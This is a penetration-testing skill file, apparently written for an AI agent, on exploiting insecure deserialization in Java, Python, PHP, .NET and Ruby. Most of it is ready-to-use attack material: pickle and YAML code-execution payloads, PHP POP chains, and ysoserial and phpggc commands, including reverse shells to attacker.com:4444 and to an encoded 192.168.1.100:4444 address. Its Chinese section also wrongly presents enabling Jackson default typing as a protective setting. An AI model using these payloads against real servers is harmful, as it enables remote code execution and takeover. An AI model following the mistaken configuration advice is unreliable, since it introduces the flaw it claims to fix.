---
name: deserialization-testing
description: Insecure deserialization testing for Java, Python, PHP, .NET, Ruby, and Node.js covering gadget chains, type confusion, and safe validation
---

# Deserialization Testing

> **penkit51 AI** — professional penetration testing skill pack. Authorized testing only.

## Deep Exploitation Guide

# Insecure Deserialization

Insecure deserialization passes attacker-controlled byte streams or structured blobs to language-native unmarshal functions, enabling remote code execution, authentication bypass, and logic manipulation through magic methods and gadget chains. Test any endpoint accepting serialized objects, session blobs, or opaque binary tokens.

## Attack Surface

**Formats**
- Java: Java native serialization, XStream, JSON → object mappers (Jackson, Fastjson), YAML (SnakeYAML)
- Python: `pickle`, `yaml.load` (unsafe), `marshal`, shelve
- PHP: `unserialize()`, Phar deserialization
- .NET: `BinaryFormatter`, `Json.NET TypeNameHandling`, ViewState
- Ruby: `Marshal.load`, YAML.load
- Node.js: `node-serialize`, `unserialize.js` (less common; see prototype_pollution for merge bugs)

**Input Locations**
- Cookies, session tokens, hidden form fields
- API parameters (`data`, `state`, `object`, base64 blobs)
- Message queues, WebSocket binary frames, file uploads
- Cache entries, database columns storing serialized objects

## Reconnaissance

**Detection Signals**
- Base64 blobs starting with magic bytes:
  - Java: `ac ed 00 05` (hex `rO0` base64)
  - PHP: `O:`, `a:`, `s:` prefixes after decode
  - .NET BinaryFormatter: starts with `00 01 00 00 00 ff ff ff ff`
- `Content-Type` with binary or custom serialization
- Framework indicators: Java apps with Spring, Struts, JSF; PHP with Symfony sessions

**White-Box Indicators**
```
pickle.loads    unserialize(    ObjectInputStream    BinaryFormatter
yaml.load       readObject(     TypeNameHandling    Marshal.load
```

## Key Vulnerabilities

### Java Deserialization

**Gadget Chains**
- Commons Collections, Commons BeanUtils, Spring, Groovy, Rome, JDK-only chains (varies by classpath)
- Tools: ysoserial (authorized testing only), manual chain selection by classpath

**Test Flow**
1. Confirm deserialization sink (HTTP param, cookie, RMI, JMX if exposed)
2. Fingerprint library versions from errors, headers, or bundled libs
3. Generate gadget payload for available chain; expect DNS/HTTP callback or command execution

**Jackson / JSON Typing**
```json
["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://attacker/o", "autoCommit":true}]
```
When `enableDefaultTyping` or `@JsonTypeInfo` allows attacker-chosen types.

### Python Pickle

Pickle executes arbitrary code during unpickling by design:
```python
import pickle, os, base64
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
# base64 encode pickle.dumps(Exploit()) and send as cookie/param
```

**YAML**
```yaml
!!python/object/apply:os.system ['id']
```
When `yaml.load` used instead of `yaml.safe_load`.

### PHP unserialize()

**Object Injection**
- Magic methods: `__wakeup`, `__destruct`, `__toString`, `__call`
- POP chains through framework classes (Laravel, Symfony, WordPress plugins)

**Phar Deserialization**
- Upload or reference `phar://` wrapper triggering metadata deserialization on file operations

### .NET Deserialization

**BinaryFormatter / LosFormatter**
- Never safe on untrusted input; full RCE with known gadget chains (ysoserial.net)

**Json.NET**
```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework", ...}
```
When `TypeNameHandling` != `None`.

**ViewState**
- MAC disabled or weak machine keys → forge deserialized view state

### Ruby Marshal

- `Marshal.load` on user input → gadget chains in Rails/Devise versions (context-dependent)

## Advanced Techniques

**Signed Blob Bypass**
- If HMAC/signing uses weak secret or algorithm confusion, forge serialized payload
- Strip signature and test unsigned code paths
- Length extension on MAC if applicable (older custom schemes)

**Second-Order Deserialization**
- Store serialized blob in profile/import; trigger on admin export, cache warm, or batch job

**Compression Wrappers**
- Gzip/base64 nested encoding bypassing naive WAF inspection

## Testing Methodology

1. **Find sinks** — Locate decode/unmarshal calls on user-influenced data
2. **Confirm format** — Magic bytes, error stack traces, framework fingerprint
3. **Safe oracle** — DNS/HTTP OAST callback or sleep/ping before full RCE PoC
4. **Gadget selection** — Match classpath/runtime version to available chains
5. **Minimal PoC** — Demonstrate code execution or critical logic bypass with least destructive command
6. **Session/cookie focus** — Deserialize server-side session stores (Java, PHP) early

## Validation

1. Demonstrate attacker-controlled object graph reaches dangerous sink (unmarshal/readObject)
2. Show impact: RCE (bounded command), auth bypass object, or privilege field manipulation
3. Provide encoded payload and exact injection point (cookie name, parameter, header)
4. Confirm on fixed version or alternate instance that identical payload fails safely
5. Document library/version and gadget chain class names for remediation

## False Positives

- Base64 data is encrypted or signed with verified HMAC before deserialization
- Only primitive types deserialized (whitelist schema, no polymorphic types)
- `pickle`/`Marshal` not used; JSON parsed to dict without object instantiation
- Deserialization in isolated sandbox with no network/exec primitives (verify thoroughly)
- Error mentions serialization class but input is never passed to unmarshal (dead code path)

## Bypass Methods

- Encoding layers: base64 → gzip → serialize
- Alternative parameters storing same session (`session`, `session_backup`, `state`)
- Switch content-type or parameter location (GET vs POST vs cookie)
- Type confusion: JSON array vs object hitting different deserializer branches
- Unicode/UTF-7 smuggling in PHP serialized strings (legacy contexts)

## Impact

- Remote code execution on application servers
- Authentication bypass via forged session objects
- Privilege escalation through manipulated role/admin fields in deserialized classes
- Full application compromise in Java/PHP/.NET stacks with known gadget libraries

## Pro Tips

1. Always fingerprint versions before firing ysoserial — wrong chain wastes time and noise
2. Start with DNS/HTTP callback gadgets before command execution in production-like targets
3. Check cookies named `JSESSIONID` alternatives, `.ASPXAUTH`, `laravel_session`, custom tokens
4. In white-box, trace from `readObject`/`unserialize`/`pickle.loads` backward to source
5. ViewState MAC off is still common on legacy ASP.NET — test early on `.aspx` apps

## Tooling

Payload generation is the practitioner's core tool here. The sandbox has `git`/`python`/`go` and **interactsh-client** (OAST); add a JRE or `php-cli` if you need the Java/PHP generators.

| Tool | Language / format | Use |
|------|-------------------|-----|
| **ysoserial** (frohoff) | Java native | Gadget-chain payloads: `CommonsCollections1-7`, `Groovy1`, `Spring1/2`, and `URLDNS` for a safe no-exec DNS oracle. Needs a JRE. |
| **phpggc** (ambionics) | PHP `unserialize` / Phar | Framework POP chains (Laravel, Symfony, WordPress, Drupal, Monolog). Needs `php-cli`. |
| **ysoserial.net** | .NET `BinaryFormatter` / Json.NET | Windows/.NET gadget payloads. Needs .NET/mono — usually out of scope in a Linux sandbox. |

```
# Java: prove the sink with a no-exec DNS oracle BEFORE any RCE chain
java -jar ysoserial.jar URLDNS "http://$(interactsh-client -json | jq -r .host)" | base64 -w0

# PHP: generate a Laravel POP chain (base64), fast path via a framework gadget
./phpggc -b Laravel/RCE9 system id
```

Confirm the sink with a callback (`URLDNS` / interactsh OAST) before firing a command-exec chain, and match the chain to the fingerprinted library version — the wrong chain just adds noise.

## Summary

Treat every deserialization of untrusted data as critical. Safe patterns use JSON schema validation without type polymorphism, `yaml.safe_load`, signed encrypted tokens, or no custom serialization at all. Prove impact with callback or bounded execution — not just error stack traces.

## Platform Methodology

# 反序列化漏洞测试

## 概述

反序列化漏洞是一种利用应用程序反序列化不可信数据导致的漏洞，可能导致远程代码执行、拒绝服务等。本技能提供反序列化漏洞的检测、利用和防护方法。

## 漏洞原理

应用程序将序列化的数据反序列化为对象时，如果数据来源不可信，攻击者可以构造恶意序列化数据，在反序列化过程中执行任意代码。

## 常见格式

### Java

**常见库：**
- Java原生序列化
- Jackson
- Fastjson
- XStream
- Apache Commons Collections

### PHP

**常见函数：**
- unserialize()
- json_decode()

### Python

**常见模块：**
- pickle
- yaml
- json

### .NET

**常见类：**
- BinaryFormatter
- SoapFormatter
- DataContractSerializer

## 测试方法

### 1. 识别序列化数据

**Java序列化特征：**
```
AC ED 00 05 (十六进制)
rO0 (Base64)
```

**PHP序列化特征：**
```
O:8:"stdClass"
a:2:{s:4:"test";s:4:"data";}
```

**Python pickle特征：**
```
\x80\x03
```

### 2. 检测反序列化点

**常见位置：**
- Cookie值
- Session数据
- API参数
- 文件上传
- 缓存数据
- 消息队列

### 3. Java反序列化

**Apache Commons Collections利用：**
```java
// 使用ysoserial生成Payload
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin
```

**常见Gadget链：**
- CommonsCollections1-7
- Spring1-2
- ROME
- Jdk7u21

### 4. PHP反序列化

**基础测试：**
```php
<?php
class Test {
    public $cmd = "id";
    function __destruct() {
        system($this->cmd);
    }
}
echo serialize(new Test());
// O:4:"Test":1:{s:3:"cmd";s:2:"id";}
?>
```

**魔术方法利用：**
- __destruct()
- __wakeup()
- __toString()
- __call()

### 5. Python pickle

**基础测试：**
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

pickle.dumps(RCE())
```

## 利用技术

### Java RCE

**使用ysoserial：**
```bash
# 生成Payload
java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}" > payload.bin

# Base64编码
base64 -w 0 payload.bin
```

**手动构造：**
```java
// 使用Gadget链构造恶意对象
// 参考ysoserial源码
```

### PHP RCE

**利用POP链：**
```php
<?php
class A {
    public $b;
    function __destruct() {
        $this->b->test();
    }
}

class B {
    public $c;
    function test() {
        call_user_func($this->c, "id");
    }
}

$a = new A();
$a->b = new B();
$a->b->c = "system";
echo serialize($a);
?>
```

### Python RCE

**Pickle RCE：**
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/attacker.com/4444 0>&1',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload))
```

## 绕过技术

### 编码绕过

**Base64编码：**
```
原始: rO0ABXNy...
编码: ck8wQUJYTnk...
```

**URL编码：**
```
%72%4F%00%AB...
```

### 过滤器绕过

**使用不同Gadget链：**
- 如果CommonsCollections被过滤，尝试Spring
- 如果某个版本被过滤，尝试其他版本

### 类名混淆

**使用反射：**
```java
Class.forName("java.lang.Runtime").getMethod("exec", String.class)
```

## 工具使用

### ysoserial

```bash
# 列出可用Gadget
java -jar ysoserial.jar

# 生成Payload
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin

# 生成Base64
java -jar ysoserial.jar CommonsCollections1 "command" | base64
```

### PHPGGC

```bash
# 列出可用Gadget
./phpggc -l

# 生成Payload
./phpggc Monolog/RCE1 system id

# 生成编码Payload
./phpggc -b Monolog/RCE1 system id
```

### Burp Suite

1. 拦截包含序列化数据的请求
2. 使用插件生成Payload
3. 替换原始数据
4. 观察响应

## 验证和报告

### 验证步骤

1. 确认可以控制序列化数据
2. 验证反序列化触发代码执行
3. 评估影响（RCE、数据泄露等）
4. 记录完整的POC

### 报告要点

- 漏洞位置和序列化数据格式
- 使用的Gadget链或利用方式
- 完整的利用步骤和PoC
- 修复建议（输入验证、使用安全序列化等）

## 防护措施

### 推荐方案

1. **避免反序列化不可信数据**
   - 使用JSON替代
   - 使用安全的序列化格式

2. **输入验证**
   ```java
   // 白名单验证类名
   private static final Set<String> ALLOWED_CLASSES = 
       Set.of("com.example.SafeClass");
   
   private Object readObject(ObjectInputStream ois) {
       // 验证类名
       // ...
   }
   ```

3. **使用安全配置**
   ```java
   // Jackson配置
   objectMapper.enableDefaultTyping();
   objectMapper.setVisibility(PropertyAccessor.FIELD, 
       JsonAutoDetect.Visibility.ANY);
   ```

4. **类加载器隔离**
   - 使用自定义ClassLoader
   - 限制可加载的类

5. **监控和日志**
   - 记录反序列化操作
   - 监控异常行为

## 注意事项

- 仅在授权测试环境中进行
- 注意不同版本库的Gadget链差异
- 测试时注意Payload大小限制
- 了解目标应用的依赖库版本

## Validation & Reporting

- Confirm every finding with reproducible PoC before reporting
- Document: severity (CVSS), affected asset, steps, evidence, remediation
- Use `record_vulnerability` when running inside the penkit51 platform
- Chain low-severity findings into higher-impact attack paths
- Never report without evidence — distinguish hypothesis from confirmed vuln

